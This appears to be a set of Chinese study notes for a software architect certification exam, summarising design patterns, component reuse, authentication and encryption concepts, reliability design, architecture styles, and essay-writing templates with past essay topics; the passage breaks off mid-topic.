用例视图：围绕上述4个视图所做的各种决定，强调从用户角度看到的或需要的系统功能，是最基本的需求分析模型。 设计模式（P195） 创建性模式：就是创建对象的模式，抽象了实例化的过程。它帮助一个系统独立于如何创建、组合和表示它的那些对象。 结构性模式：解决怎样组装现有的类，设计他们的交互方式，从而达到一定功能的目的。 行为性模式：涉及到算法和对象间的职责分配。它描述了对象和类的模式，以及他们之间的通信模式，刻画了在程序运行时难以跟踪的复杂的控制流。 [info] 设计模式图例也要清楚。 分类 设计模式 说明 应用场景 创建性模式 Abstract Factory（抽象工厂） 提供一个创建 [一列相关或相互依赖对象的] 接口，而无需指定具体的构造类 · 期望所提供的类库，只开放接口而非实现· 一系列相关的对象是共同使用的（必须保证，否则可用Factory Method作为替代）   Factory Method（工厂方法） 定义一个用于创建对象的接口，让子类决定将哪一个类实例化 · 类不能预料它所必须创建的对象的类· 类希望其子类指定它要创建的对象   Builder（构建器 / 建造者） 将一个复杂对象的构建与其表示相分离，使得相同的构造过程可以创建不同的对象 · 创建对象的算法独立于对象的组成部分· 构造过程必须允许已构建对象有不同的表示   Prototype（原型） 用原型实例指定创建对象的种类，并通过原型拷贝来创建新的对象 · 在运行时需要实例化类（如动态载入）· 类的实例是仅有的一些不同状态组合之一   Singleton（单例） 保证一个类仅有一个实例，并提供一个访问它的全局访问点 · 只有一个类实例 结构性模式 Adapter（适配器） 将一个类的接口转换成期望的另一个接口 · 要使用的已有类与所需接口不匹配· 所创建的可重用的类不需要兼容接口· 在一个不同于已知对象接口的接口环境中使用· 必须进行多个源之间的接口转换   Bridge（桥接） 将抽象部分与其实现部分分离，使它们均可独立地变化 · 想避免抽象与实现之间存在永久性绑定· 抽象及其实现可使用子类进行扩展· 抽象的实现被改动对客户端无影响   Composite（组合） 将对象组合成树形结构，以表示[部分-整体]的层次结构，使得对单个对象和复合对象的使用具有一致性 · 想要表示对象的整个或部分层次结构· 想要忽略复合对象和单个对象间的差异· 结构可以具有任何级别的复杂性，且为动态的   Decorator（装饰者） 在不修改对象外观和功能的情况下添加或删除对象功能，可动态地为一个对象添加额外的职责 · 为对象动态而透明地添加职责，不影响其他对象· 想要在以后可能会修改的对象中添加职责· 无法通过静态子类化实现扩展   Facade（外观） 为子系统中的一组接口提供了一个统一的高级接口，使得子系统更易使用 · 想要为复杂的子系统提供简单的接口· 在客户端和抽象的实现类中存在许多依赖关系· 想要对子系统进行分层   Flyweight（享元 / 轻量） 通过共享技术大量减少细粒度对象，避免多个具有相同信息的实例带来的开销 · 应用程序使用了大量的对象· 因对象数量巨大造成很高的存储开销· 应用程序不依赖于对象的身份   Proxy（代理） 为其他对象提供一个代理以控制这个对象的访问 · 需要比简单的指针更灵活、更全面的对象引用 行为性模式 Template Method（模板） 定义一个操作中的算法骨架，将一些步骤迟延到子类中实现，使得可以不改变一个算法的结构即可重定义该算法某些特定步骤 · 期望一次实现算法不变的部分，而由子类实现可变的行为· 把子类的通用行为定义到通用类，避免重复代码   Command（命令） 将一个请求封装成一个命令对象，这样就可以保存命令，并将命令传递给方法，再由该方法返回该命令 · 希望通过要执行的动作来参数化对象· 要在不同的时间指定、排序以及执行请求· 必须支持Undo、日志记录或事务   Interpreter（解释器） 给定一个语言，定义其文法的一种表示，并定义一个解释器，用该表示去解释语言中的句子 · 语言的语法比较简单· 效率并非最主要的问题   Chain of Responsibility（责任链） 使多个相关对象连成一条链，并沿着链传递发送者的请求，直到有一个对象处理之 · 多个对象可以处理一个请求，而处理器却未知· 希望在不确定请求的接收对象的情况下，向多个对象中的一个发送请求· 可以动态指定能够处理请求的对象集   Memento（备忘录） 保持对象状态的“快照”，使得对象可以在不向外界公开其内容的情况下返回到它的最初状态 · 必须保存对象状态的快照以便以后恢复状态· 使用直接接口获得状态可能会公开对象的实现细节，从而破坏对象的封装性   State（状态） 允许对象在内部状态变化时，改变其行为，并修改其类 · 操作具有大量以及多部分组成的取决于对象状态的条件语句   Strategy（策略） 定义一系列的封装好的算法，让它们可以相互替代，且算法的变化可以独立于使用它们的用户 · 相关类只在行为方面有所区别· 需要算法的不同变体· 算法使用客户端未知的数据   Observer（观察者） 定义了对象间一到多的依赖关系，这样当对象改变状态时，将自动通知并更新它所有依赖的对象 · 对一个对象的修改涉及到对其他对象的修改，且不知道有多少对象需要进行相应的修改· 对象在不用假设对象标识的前提下通知其他对象   Iterator（迭代） 提供一种方法顺序访问一个聚合对象中的各个元素，而又不暴露该对象的内部表示 · 不开放集合对象内部表示的前提下访问其内容· 支持集合对象的多重遍历· 为遍历集合中的不同结构提供了统一的接口   Visitor（访问者） 不改变原来类结构（固定结构）的基础上增加新的功能 · 对象结构包含许多具有不同接口的对象类，并且需要对这些依赖于具体类的对象进行操作· 定义对象结构的类很少被修改，但希望在此结构上定义新操作   Mediator（中介者） 用一个中介对象来封装一系列对象的交互，使各对象不需显式地相互引用，从而使其耦合松散，而且可以独立改变对象间的交互 · 对象集合需以一个定义规范但复杂的方式通信· 希望在不使用子类的情况下自定义分布在几个对象之间的行为 获取构件的方法（P247） 从现有构件中获得符合要求的构件，直接使用或作适应性的修改，得到可重用的构件。 通过遗留工程，将具有潜在重用价值的构件提取出来，得到可重用的构件。 从市场上购买现成的商业构件，即COTS（Commercial Off-The-Shell）构件。 开发新的符合要求的构件。 开发构件的策略（P267） 修改已有构件，产生新构件。 全新开发新构件。 构件组装（P271） 将构件库中的构件经适当修改后互相连接，或将它们与当前开发项目中的软件元素相连接，最终构成新的目标软件。构件组装技术大致可以分为三种： 基于功能的组装技术　　采用子程序调用和参数传递的方式将构件组装起来。它要求库中的构件以子程序/过程/函数的形式出现，并且接口说明必须清晰。开发人员使用此组装技术时，需先对目标软件系统分解成强内聚、松耦合的功能模块，再根据各模块功能提取构件，进行适应性修改后挂接到功能分解框架中。 基于数据的组装技术　　根据当前软件问题的核心数据结构设计出一个框架，再根据框架中各结点的需求提取构件并进行适应性修改，最后把构件逐个分配到框架中的适当位置。这种组装方式也要求构件以子程序形式出现，但依赖的软件设计方法不是功能分解，而是面向数据的设计方法。 面向对象的组装技术　　如果从类库中检索出来的基类能够完全满足新软件项目的需求，则直接使用；否则必须以类库中的基类为父类，采用构造法或子类法生成子类。由于封装和继承特性，该技术更适合支持软件重用。 主流构件标准（P275） CORBA、COM/DCOM/COM+、EJB 主要的身份认证技术（P315） 用户名和口令认证：主要是通过一个客户端和服务器共知的口令（或与口令相关的数据）进行验证。根据处理形式的不同，分为直接通过明文传送验证数据、利用单向散列函数处理验证数据、利用单向散列函数和随机数处理验证数据。 令牌认证：该方式中，进行验证的密钥存储于令牌中。目前的令牌包括安全认证书和智能卡等。 生物识别认证：主要是根据认证者的图像、指纹、气味和声音等作为认证数据。 授权侵犯 指被授权以某一目的使用某一系统或资源的某人，将此权限用于其他非授权的目的，也称“内部攻击”。 抗抵赖框架 内容：框架中的抗抵赖服务包括证据的生成、验证和记录，以及在解决纠纷时随即进行的数据恢复和再次验证。 目的：提供有关特定事件或行为的证据。 如必须确认数据原发送者和接受者的身份和数据完整性，在某些情况下，可能需要涉及上下文关系的证据（如日期、事件、原发者/接受者的地点等）。 基于口令的简单认证机制 与 基于公钥体系的认证机制 优缺点比较 口令认证方式实现简单，但由于口令复杂度及管理方面等原因，易收到认证攻击。而在公钥认证方式中，由于其密钥机制的复杂性，同时在认证过程中私钥不在网络上传输，因此可以有效防止认证攻击，与口令认证方式相比更安全。 口令的认证方式中，用户口令为用户与服务器共享，没有用户独有的直接秘密信息。而在公钥认证方式中，可基于用户私钥对私有数据进行加密保护。 公钥认证方式，其协议和计算的复杂度要高于口令认证方式，同时由于管理复杂、认证效率低，其使用环境的用户数不宜过多。 对称加密策略 机密性：发送者利用对称密钥对要发送的数据进行加密，只有拥有正确相同密钥的接收者才能将数据正确解密，从而提供机密性。 完整性：发送者根据要发送的数据生成消息认证码（或消息摘要），利用对称密钥对消息认证码进行加密并附加到数据上发送；接收者使用相同密钥将对方发送的消息认证码解密，并根据接收到的数据重新生成消息认证码，比较两个认证码是否相同以验证数据的完整性。 公钥加密策略 机密性：发送者利用接收者的公钥对要发送的数据进行加密，只有拥有对应私钥的接收者才能将数据正确解密，从而提供机密性。 完整性：发送者根据要发送的数据生成消息认证码（或消息摘要），利用自己的私钥对消息认证码进行加密并附加到数据上发送；接收者利用对方的公钥将对方发送的消息认证码解密，并根据接收到的数据重新生成消息认证码，比较两个认证码是否相同以验证数据的完整性。 软件可靠性的定量描述（P355） 规定时间　　自然时间：即日历时间，指日常计时用的年、月、日等自然流逝的时间段。　　运行时间：指软件从启动开始，到运行结束的时间段。　　执行时间（最准）：指软件运行过程中，CPU执行程序指令所用的时间总和。 失效概率　　F(t)表示软件运行时失效的随机函数，在时间域(0,+∞)单调递增，F(0)=0，F(+∞)=1 可靠度　　系统软件在规定的条件下、规定的时间内不会发生失效的概率。R(t)=1-F(t) 失效强度　　单位时间软件系统出现失效的概率。f(t)=F’(t) 失效率　　又称风险系数，或条件失效强度。　　是指在运行至此软件系统未出现失效的情况下，单位时间软件系统出现失效的概率： λ(t) = R'(t) / R(t) 可靠度与失效率之间的换算　　当可靠度 R(t)>0.95 时，λ(t)= (1-R(t)) / t 平均无失效时间　　软件运行后，到下一次出现失效的平均时间。 可靠性设计技术（P377） 容错设计技术：用于软件失效后果特别严重的场合。 检错技术：在软件出现故障后能及时发现并报警，提醒维护人员处理。 降低复杂度设计：在保证软件功能的基础上，降低软件复杂度（简化结构、缩短代码长度、优化数据流等），从而提高软件可靠性。 容错设计技术（P377） 恢复块设计、N版本程序设计、冗余技术 恢复块设计（P377） 是一种动态故障屏蔽技术。一个恢复块包含有若干个功能相同、设计差异的程序块文本，每一时刻有一个文本处于运行状态。一旦该文本出现故障，则用备份文本加以替代，从而构成“动态冗余”。 N版本程序设计（P377） 是一种静态故障屏蔽技术，其设计思路是用N个具有相同功能的程序同时执行一项计算，结果通过多数表决来选择。其中N个版本的程序必须由不同的人独立设计，使用不同的方法、设计语言、开发环境和工具来实现。目的是减少N版本程序在表决点上相关错误的概率。 冗余技术（P377） 实现容错计算的主要手段是冗余。 冗余技术 分类 说明 结构冗余（硬件冗余） 静态冗余 通过表决和比较来屏蔽系统中出现的错误   动态冗余 多重模块待机储备，相继运行，以维持系统的正常工作（冷备、热备系统）   混合冗余 静态冗余和动态冗余的综合，效果最好，成本很高，仅用于可靠性要求极高的情况 信息冗余   在实现正常功能所需的信息外，再添加一些额外信息，以保证运行结果的正确性 时间冗余   以降低系统运行速度为代价，减少硬件冗余和信息冗余的开销，以达到可靠性的目的 冗余附加技术   指为实现上述冗余技术所需的资源和技术 动态冗余（P378） 又称主动冗余，它是通过故障检测、故障定位及故障恢复等手段达到容错的目的，其主要方式是多重模块待机储备，当系统检测到某工作模块出现错误时，就用一个备用模块代替它并重新运行。 各备用模块在其待机时，可与主模块一样工作，也可以不工作。前者叫热备份系统（双重系统），后者叫冷备份系统（双工系统、双份系统）。 检错技术优缺点（P378） 优点：实现代价一般低于容错技术和冗余技术。 缺点：不能自动解决故障，出现故障后如果不进行人工干预，最终将导致系统不能正常运行。 检错设计技术要素（P378） 检测对象　　① 检测点：容易出错的地方和出错对软件系统影响较大的地方。　　② 检测内容：有代表性的、易于判断的指标。 检测延时　　从软件发生故障到被自检出来的延时时间。若延时过长，甚至影响故障的及时报警，则需更换检测对象或检测方式。 实现方式　　① 判断返回结果：如果返回结果超出正常范围，则进行异常处理。　　② 计算运行时间：如果某个模块或函数运行时间超过预期时间，可以判断出现故障。　　③ 置状态标志位： 处理方式　　大多数都采用“查出故障-停止软件运行-报警”的处理方式。　　但根据故障的不同情况，也可以不停止软件运行，这一般由故障是否需要实时处理决定。 FMEA失效模式与效应分析（P379） FMEA是FMA（故障模型分析）和FEA（故障影响分析）的组合，它对系统各种可能的风险进行评价、分析后，在现有技术的基础上消除这些风险，或将这些风险降低到可接受的水平。 FMEA主要活动 找出产品/过程中潜在的故障模式 根据相应的评价体系对 [所找出的潜在故障模式] 进行风险量化评估 列出故障起因/机理，寻找预防或改进措施。 FMEA分类 由于产品故障可能与设计、制造过程、使用、承包商/供应商的服务有关，因此FMEA又分为： 设计FMEA、过程FMEA、使用FMEA、服务FMEA ODP分布式数据架构（P382） 由多个计算机系统上的多个局部数据库系统构成，数据可以在这些数据库中进行传送，并接受不同的DBMS的管理。同时，安装了这些系统的机器分布在不同的地理位置，并通过多种通信网络连接在一起，使得企业数据可以分布在不同的计算机上，而一个应用程序则可以操作位于不同地理位置的机器上的数据。 集中式数据架构 集中式数据架构，是由一个处理器、与它相关联的数据存储设备以及其他外围设备组成，它被物理地定义到单个位置。 根据系统提供的数据处理能力，用户可以在同样的站点上操作，也可以在地理位置隔开的其他站点上通过远程终端来操作。系统及其数据管理被某个站点或中心站点集中控制。 集中式和分布式数据架构的扩展方式 集中式　　通过向上扩展提升系统的可扩展性。　　具体的实现方式包括硬件扩容（增加CPU数量、内存容量、磁盘数量等）和硬件升级（更换为高端主机或高速磁盘等）。 分布式　　通过向外扩展提升系统的可扩展性。　　具体的实现方式包括数据复制、数据垂直切分/水平切分、缓存和全文搜索。 开放式架构的基本特点 可移植性：各种计算机应用系统可在具有开放式架构特性的各种计算机系统中进行移植，不论这些计算机是否为同种型号、同种机型。 可互操作性：若计算机网络中的各节点机都具有开放架构的特性，则该网络上各节点机间可相互操作和资源共享。 可剪裁性：若某计算机系统具有开放性架构特性，则在该系统的低档机上运行的应用系统应能在高档机上运行，原在高档机上运行的应用系统经过裁剪后也可在低档机上运行。 易获得性：在具有开放架构特性的机器上所运行的软件环境易于从多方获得，不受某个来源控制。 MVC架构风格（P419） 通过把业务逻辑、数据、界面显示进行分离的代码组织方法。它将业务逻辑聚集到一个部件中，在个性化定制界面以及改进用户交互的同时，不需要重新编写业务逻辑。 MVC架构把整个软件系统划分为模型（M）、视图（V）和控制器（C）三个部分，其中： 模型：负责维护并保存具有持久性的业务数据，实现业务处理功能，并将业务数据的变化情况及时通知视图。 视图：负责呈现模型中包含的业务数据，响应模型变化通知，更新呈现形式，并向控制器传递用户的界面操作。 控制器：负责将用户的界面动作映射为模型中的业务处理功能并实际调用之，然后根据模型返回的业务处理结果选择新的视图。 MVC设计模式-示例图（P419） P419 MVC模式的优点（P420） 允许多种用户界面的扩展：新增界面只需改动对应的视图和控制器，模型无需变动。 易于维护：模型在扩展时若保持接口不变，则控制器和视图无需变动。 功能强大的用户界面：程序使用更清晰，界面发布更友好。 从设计模式角度描述用XML作为GUI描述语言的机制（P421） 从设计模式的角度来说，整个XML表现层解析的机制是一种策略模式。 在调用显示GUI时，不是直接地调用特定表现技术的API，而是装载GUI对应的XML配置文件，然后根据特定的表现技术解析器解析XML，得到GUI视图实例对象。 这样，对GUI开发人员来说，GUI视图只需要维护一套XML文件即可。 基于XML的界面管理技术（P422） 基于XML的界面管理技术可实现灵活的 界面配置、界面定制 和 界面动态生成。 界面配置：是对用户对界面的静态定义，通过读取配置文件的初始值对界面配置。由界面配置对软件功能进行裁剪、重组和扩充，以实现特殊需求。 界面定制：是对用户界面的动态修改过程。在软件运行过程中，用户可按需求和使用习惯，对界面元素的属性进行修改。软件运行结束时，界面定制的结果被保存。 动态生成界面：系统通过DOM API读取XML配置文件的表示层信息，通过数据存取类读取数据库中的数据层信息，运行时由界面元素动态生成界面。界面配置和定制模块在软件运行前后修改配置文件、更改界面内容。 基于XML的界面管理技术框架-示例图（P423） P423 TLS三层栈软件总体架构特点 应用层（AL）、操作系统层（OSL）、模块支持层（MSL） -> 硬件平台 应用软件与操作系统服务相关，不直接操作硬件 操作系统通过模块支持层访问硬件，可与具体硬件无关 模块支持层将硬件抽象成标准操作 通过三层栈的划分可实现硬件的快速更改与升级，应用软件的升级不会引起硬件的变更 嵌入式操作系统VxWorks与Linux的差异（P505） 比较类型 VxWorks Linux 工作方式 操作系统与应用程序处于同一的存储空间 操作系统与应用程序处于不同的存储空间 多任务支持 支持多任务（线程）操作 支持多进程、多线程操作 实时性 硬实时系统 实时系统 安全性 任务间无隔离保护 支持进程间隔隔离保护 标准API 支持 支持 Linux操作系统特点 Linux是一种安全性较强的操作系统。其内核工作在系统态，应用软件工作在用户态，可以有效防止应用软件对操作系统的破坏。 Linux系统调度的最小单位是线程，线程归属于进程，进程具有自己的独立资源。进程通过MMU实现多功能应用间隔离。 Linux系统支持硬件抽象，可以有效实现TLS结构，并将硬件抽象与操作系统分离，便于实现硬件的外场快速更换。 嵌入式操作系统故障类型 硬件故障：如CPU、存储器和定时器等 应用软件故障：如数值越界、异常和超时等 操作系统故障：如越权访问、死锁和资源枯竭等。 嵌入式操作系统故障滤波算法 门限算法、递减算法、递增算法、周期滤波算法 嵌入式操作系统容错算法 N+1备份、冷备、温备、热备 基于VME总线机载和基于FC总线机载的嵌入式系统架构比较 VME总线采用存储映射方式、多主机仲裁机制，仲裁方式为菊花链方式（串行仲裁），同一时刻仅由单一主机控制，导致任务执行时延大，限制了可扩展性，实时性差，带宽低。 FC总线采用消息包交换机制，支持广播和组播，任务并发性好，传输距离远，误码率低，且允许在同一接口上传输多种不同的协议，可扩展性好，可靠性高，实时性好，带宽高。 ESB企业服务总线（P537） 企业服务总线是由中间件技术实现的面向服务架构的基础软件平台，支持异构环境中的服务以基于消息和事件驱动模型式的交互，并且具有适当的服务质量和可管理性。 ESB主要功能（P538） 提供位置透明的消息路由和寻址服务（服务位置透明性） 提供服务注册和命名管理功能 支持多种消息传递范型（如请求/响应、发布/订阅等） 支持多种可以广泛使用的传输协议（传输协议转换） 支持多种数据格式及其相互转换（消息格式转换） 提供日志和监控功能（监控与管理） 消息增强支持 安全性支持 ESB作为集成框架的优点 能够实现灵活的部署结构，包括CS结构、P2P结构等 待集成系统只需和总线进行联系，彼此间无需相互通信，大大降低了系统的耦合程度 在加入新的集成系统时，只需采用插件的方式实现传输协议和数据格式适配即可，系统的可扩展性较强。 项目计划应包含的内容 项目背景 项目经理及其主管领导、客户方及其主管领导、项目管理团队、项目实施团队 项目总体技术解决方案 项目的管理过程及执行水平 项目过程的工具、技术和输入输出的描述 项目的生命周期和相关的项目阶段 项目的最终目标和阶段性目标 进度计划 项目预算 变更流程和变更控制委员会 对于内容、范围和事件的关键管理评审，以便于确定悬留问题和未决决策 缩短项目工期的方式 快速跟进　　通过对项目各阶段的逻辑关系进行并行调整来缩短项目周期。　　它是在当风险不大时，通过精心安排而使项目的前后阶段相互搭接，以加快项目进展的做法。　　快速跟进只是将部分工作提前开始，所以不会明显增加成本。 赶工　　对成本和进度进行权衡，确定如何在尽量少地增加费用的前提下最大限度地缩短项目所需的时间。 REST表现层状态转换技术 REST从资源的角度来定义整个网络系统结构，分布在各处的资源由统一资源标识符URI确定，客户端应用程序通过URI获取资源的表现，并通过获得资源的表现使其状态发生改变。 REST中将 [资源] 、 [资源的表现] 和 [获取资源的动作] 三者进行分离。 REST是一种只使用HTTP和XML的基于WEB通信的技术，它可以降低开发的复杂性，提高系统的可伸缩性。而其简单性和缺少严格配置文件的特性将其与SOAP很好地隔离开来。从根本上说，REST只支持几个操作（POST、GET、PUT、DELETE），而这些操作适用于所有消息。 REST设计原则 网络上所有事物都被抽象为资源 每个资源对应一个唯一的资源标识 通过通用的连接件接口对资源进行操作 对资源的各种操作不会改变资源的标识 所有的操作都是无状态的 XACML（可扩展访问控制标记语言）相对于MAC（强制访问控制）的优点 授权的可管理性：RBAC（基于角色的控制访问）将用户与权限分离，与MAC相比，减少了授权管理的复杂性，更适合于大型企业级系统的安全管理。 细粒度访问控制的支持：XACML提供了统一的访问控制策略描述语言，策略表达能力强，可以用来描述各种复杂的和细粒度的访问控制安全需求，更适合企业复杂业务功能的访问控制要求。 分布式环境的支持：XACML的标准性便于各子系统的协作交互，各子系统或企业业务部门可以分部管理访问控制权限；而MAC则通常需要对访问控制权限集中管理，不太适合企业基于SOA集成后的分布式系统。 论文题 论文通用题型 概要叙述你参与管理和开发的软件项目，以及你在其中承担的主要工作 分析【XXX】的主要技术/手段/内容，并说明选择【XXX】的原因。 结合具体参与管理和开发的实际项目，举例说明【XXX】的具体实施过程，并详细分析实施效果。 注意：选好题型后，不要忘记在答题纸上画圈和填写考号！！！ 论文评分点 切题：30% 引用与水平深度：20% 实践性：20% 表达方式：15% 综合能力与分析能力：15% 字迹：100% 加分点 扣分点 有独特见解，体会深刻、突出 字迹潦草，难以辨认 符合当今信息系统发展的新趋势、新动向，并加以利用 自我吹嘘、自我标榜、夸大其词 内容详实，思路清晰，符合提议 通篇理论或内容空洞，泛泛而谈 论文模板 摘要：（300-400字，先摘要，再正文，占分5-10） y年m月，根据 xxx （项目背景） 的需求，我所在的 xxx （公司、团队）组织了 xxx （项目名称）项目的开发。该项目 yyy （简单项目介绍，功能模块等）。在该项目中，我担任了 ??? （项目角色）。通过采取 zzz（论文主题，包括相关的技术、方法、工具、措施），使项目得以实施完成，并正稳定地投入使用。但其实，该项目除了 aaa （特色之处、发展趋势），其实还存在 bbb （不足之处、如何改进）。 正文：（2000-3000字，先立纲，再下笔，思维导图） 　1. 项目概述（400-600字，切忌照抄摘要）： 　　1.1. 开发项目概述 　　1.2. 我承担的角色和工作 　　1.3. 项目的架构情况概述 　2. 采用的技术，为什么（1000-1400字，直奔论文主题，可以图文并茂，分点论述，但层次不宜太深） 　3. 技术的效果（200-300字，佐证论点的好处） 　4. 不足之处和改进方案（200-300字，万事不尽美，报喜不报忧会很假） 　5. 总结（100-200字，心得，我学到了什么，可以合并到第4点） 示例论文 摘要： 201x年11月，由于我司现有的 【告警保障系统 服役时间太长，性能、维护、扩展等多方问题日益严重】 （项目背景），于是我所在的 【网管团队】 （公司、团队）启动了 【告警保障系统】 （项目名称）的项目重构开发。该系统包括 【告警的采集过滤和上报、告警的规则事务管理、数据模型转换管理、通信协议管理、统计报表生成、资源集中监控器等多个业务功能模块，以及其他预留的扩展功能接口】 （简单项目介绍，功能等）。 在该项目中，我担任了架构师的职责，通过采取 zzz （论文主题，包括相关的技术、方法、工具、措施），使项目得以实施完成，并正稳定地投入使用。本文将结合我的实际工作经验，对相关过程进行描述。 正文： 　1. 项目概述（400-600字，切忌照抄摘要）： 　　1.1. 开发项目概述 　　1.2. 我承担的角色和工作 　　1.3. 项目的架构情况概述 　2. 采用的技术，为什么（1000-1400字，直奔论文主题，可以图文并茂，分点论述，但层次不宜太深） 架构角度：整体框架采用了 主程序-子程序架构风格 设计模式： 核心功能模块采用了 生产者消费者模式、有限状态机模式，以及为了容错采用的备忘录模式。 辅助功能模块采用了多种设计模式， 如共享资源的工厂模式、数据协议转换的适配器模式、资源集中监控器的中介者模式， 特定的算法模板、配置的单例模式等等 质量属性： 性能：统计报表结合sqlite和内存映射，减少IO； 系统关键位置的多线程资源解耦，避免同步。 苛刻对待内存管控，避免浪费开销。 使用数据池、线程池技术。 数据结构的选择，JVM数据结构的运行，关键代码采用本地化方式优化（牺牲平台无关性） 输入输出优化：后台集群、缓存。 可修改性：预留扩展接口，保证可扩展性。 Maven架构管理构件，SVN版本控制（可维护性） 完善的程序文档 可靠性：预防式编程，健壮性 Socket中介，减少数据库直连数 可用性：心跳，异常捕获，logback日志跟踪，基于签到模式的统计，及时发现故障并自动恢复 安全性：与Socket交互先登录，保证授权使用（机密性） 核心口令采用C++编写（机密性，牺牲平台无关性） 混淆打包（机密性） 可测试性：持续集成，测试驱动开发，功能模块保留完整测试用例，更新算法时先用用例验证。 容错设计： 以检错设计为主，核心模块采用动态冗余（采集、适配、上报） 构件管理：常用构件平台，构件管理Maven与Nexus（第三方成品构件） 　3. 技术的效果（200-300字，佐证论点的好处） 　4. 不足之处和改进方案（200-300字，万事不尽美，报喜不报忧会很假） 　5. 总结（100-200字，心得，我学到了什么，可以合并到第4点） 通过使用xxx技术，最终有效地 aaa （特色之处、发展趋势），但也遇到了一些问题： bbb （不足之处、如何改进）。 历年论文题目 2014论软件需求管理（P109） 软件需求管理是一个对系统需求变更了解和控制的过程。需求管理过程与需求开发过程相互关联，初始需求导出的同时就要形成需求管理规划，一旦启动了软件开发过程，需求管理活动就紧密相伴。 需求管理过程中主要包含变更控制、版本控制、需求跟踪和需求状态跟踪等4项活动，其目标是为项目管理人员建立一个软件需求基线，并保持软件计划、产品和活动与软件需求的一致性。 问题：请以“软件需求管理”为题，依次从以下三个方面进行论述。 1．概要叙述你参与管理和开发的软件项目以及你在其中所担任的主要工作。 2．详细描述需求管理过程中各个活动中的主要工作。 3．详细说明你所参与的软件开发项目中，是如何进行软件需求管理的，实施的具体效果如何。 2014论非功能性需求对企业应用架构设计的影响（软件架构策略） 企业应用架构(Enterprise Application Architecture) 描述了企业IT系统的功能和技术实现内容，它在企业信息化建设中起到了统一规划、承上启下的作用，向上承接了企业战略发展方向和业务模式，向下规划和指导企业各IT系统的定位和功能。企业应用架构包括了企业的应用架构蓝图、架构标准、系统的边界和定义、系统间的关联关系等。其中非功能性需求是进行企业应用架构设计时需要重点考虑的因素，不同类型的非功能性需求从不同侧面影响应用系统的架构设计。 问题：请以“非功能性需求对企业应用架构设计的影响”为题，依次从以下三个方面进行论述。 1．概要叙述你参与分析和开发的企业应用系统项目以及你所担任的主要工作。 2．分析在企业应用架构设计中应该考虑哪些非功能性需求，详细阐述这些非功能性需求是如何影响架构设计的。 3．详细说明你所参与的企业应用系统项目中，在进行系统架构设计时，考虑了哪些非功能性需求，如何通过架构设计满足了系统的这些非功能性需求。 2014论软件的可靠性设计（P377） 现代军事和商用系统中，随着系统中软件成分的不断增加，系统对软件的依赖性越来越强。软件可靠性已成为软件设计过程中不可或缺的重要组成部分。实践证明，保障软件可靠性最有效、最经济、最重要的手段是在软件设计阶段采取措施进行可靠性控制，由此提出了可靠性设计的概念。可靠性设计就是在常规的软件设计中，应用各种方法和技术，使程序设计在兼顾用户的功能和性能需求的同时，全面满足软件的可靠性要求。 问题：请以“软件的可靠性设计”为题，依次从以下三个方面进行论述。 1．概要叙述你参与管理和开发的软件项目以及你在其中所担任的主要工作。 2．简要说明目前比较主流的软件可靠性设计技术，结合项目实际情况，阐述所选择的可靠性设计技术及其原因。 3．结合你具体参与管理和开发的实际项目，举例说明所选取的软件可靠性技术的具体实施过程，并详细分析实施效果。 2014论网络安全体系设计 随着社会信息化的普及，计算机网络已经在各行各业得到了广泛的应用。目前，绝大多数业务处理几乎完全依赖计算机和网络执行，各种重要数据如政府文件、工资档案、财务账目和人事档案等均依赖计算机和网络进行存储与传输。另一方面，针对计算机和网络的攻击活动日益猖獗，网络安全已经成为当前社会的主要安全问题之一。 在上述背景下，国家标准《信息处理系统工程开放系统互联基本参考模型——第二部分：安全体系结构》（GB/T 9387.2-1995）定义了基于OSI参考模型7层协议之上的信息安全体系，其核心内容是：为了保证异构计算机进程与进程之间远距离交换信息的安全，定义了认证服务、访问控制服务、数据机密性服务、数据完整性服务和抗抵赖性服务等5大类安全服务，以及提供这些服务的8类安全机制及相应的OSI安全管理，并根据具体系统适当配置于OSI模型的7层协议之中。 问题：请以“网络安全体系设计”为题，依次从以下三个方面进行论述。 1．概要叙述你参与管理和开发的软件项目以及你在其中承担的主要工作，并详细阐述该软件系统在网络安全方面的要求。 2．请对GB/T 9387.2-1995中定义的5大类安全服务进行描述，阐述每类安全服务的定义和主要实现手段。 3．请结合项目实际，具体阐述你在项目中实现了上述5大类安全服务中的哪些服务，具体运用了哪些实现手段。 2013论软件架构建模技术与应用（P181 - 图P103） 软件架构用来处理软件高层次结构的设计和实施，它以精心选择的形式将若干结构元素进行装配，从而满足系统的主要功能和性能需求。软件架构设计的首要问题是如何表示软件架构，即如何对软件架构建模。根据建模的侧重点不同，可以将软件架构模型分为 ~结构模型、框架模型、动态模型、过程模型和功能模型~ 。Kruchten在1995年提出了“4+1”视图模型，将5种模型有机地统一在了一起。 问题： 1．概要叙述你参与管理和开发的软件项目以及你在其中所承担的主要工作。 2．简要叙述“4+1”视图模型的主要内容。结合你参与项目的实际情况，详细说明该项目需求及所涉及的软件架构（包括使用到的视图模型、创建的架构模型及使用的建模工具等）。 3．说明该项目软件架构的实施效果，分析其是否满足了项目的需求并说明原因。 2013论软件可靠性设计技术的应用（P377） 随着软件的日益普及，系统中软件成分不断增加，使得系统对软件的依赖越来越强。 软件的可靠性对系统可靠性的影响越来越大。而实践证明，保障软件可靠性最有效、最经济、最重要的手段是在软件设计阶段采取措施进行可靠性控制，为此提出了软件可靠性设计的概念。 软件可靠性设计就是在常规的软件设计中，应用各种方法和技术，使软件设计在兼顾用户功能和性能需求的同时，全面满足软件的可靠性要求。软件可靠性设计应和软件的常规设计紧密结合，贯穿于软件设计过程的始终。 问题： 1．概要叙述你参与管理和开发的软件项目以及你在其中所承担的主要工作。 2．结合项目实际，论述你在项目开发过程中，进行软件可靠性设计时遵循的基本原则；论述你在该项目中所采用的具体可靠性设计技术。 3．阐述你在具体的可靠性设计工作中，为了分析影响软件可靠性的主要因素，所采用的可靠性分析方法。 2012论基于架构的软件设计方法及应用（P131） 本题考查的知识点是ABSD。 ABSD （architecture-based software design,基于体系结构的软件设计）方法。ABSD方法是体系结构驱动，即指构成体系结构的商业、质量和功能需求的组合驱动的。使用ABSD方法，设计活动可以从项目总体功能框架明确就开始，这意味着需求抽取和分析还没有完成（甚至远远没有完成），就开始了软件设计。设计活动的开始并不意味着需求抽取和分析活动就可以终止，而是应该与设计活动并行。特别是在不可能预先决定所有需求时，例如产品线系统或长期运行的系统，快速开始设计是至关重要的。 这种方法的主要阶段包括： 2012论企业应用系统的数据持久层架构设计 本题考查数据持久层架构设计。 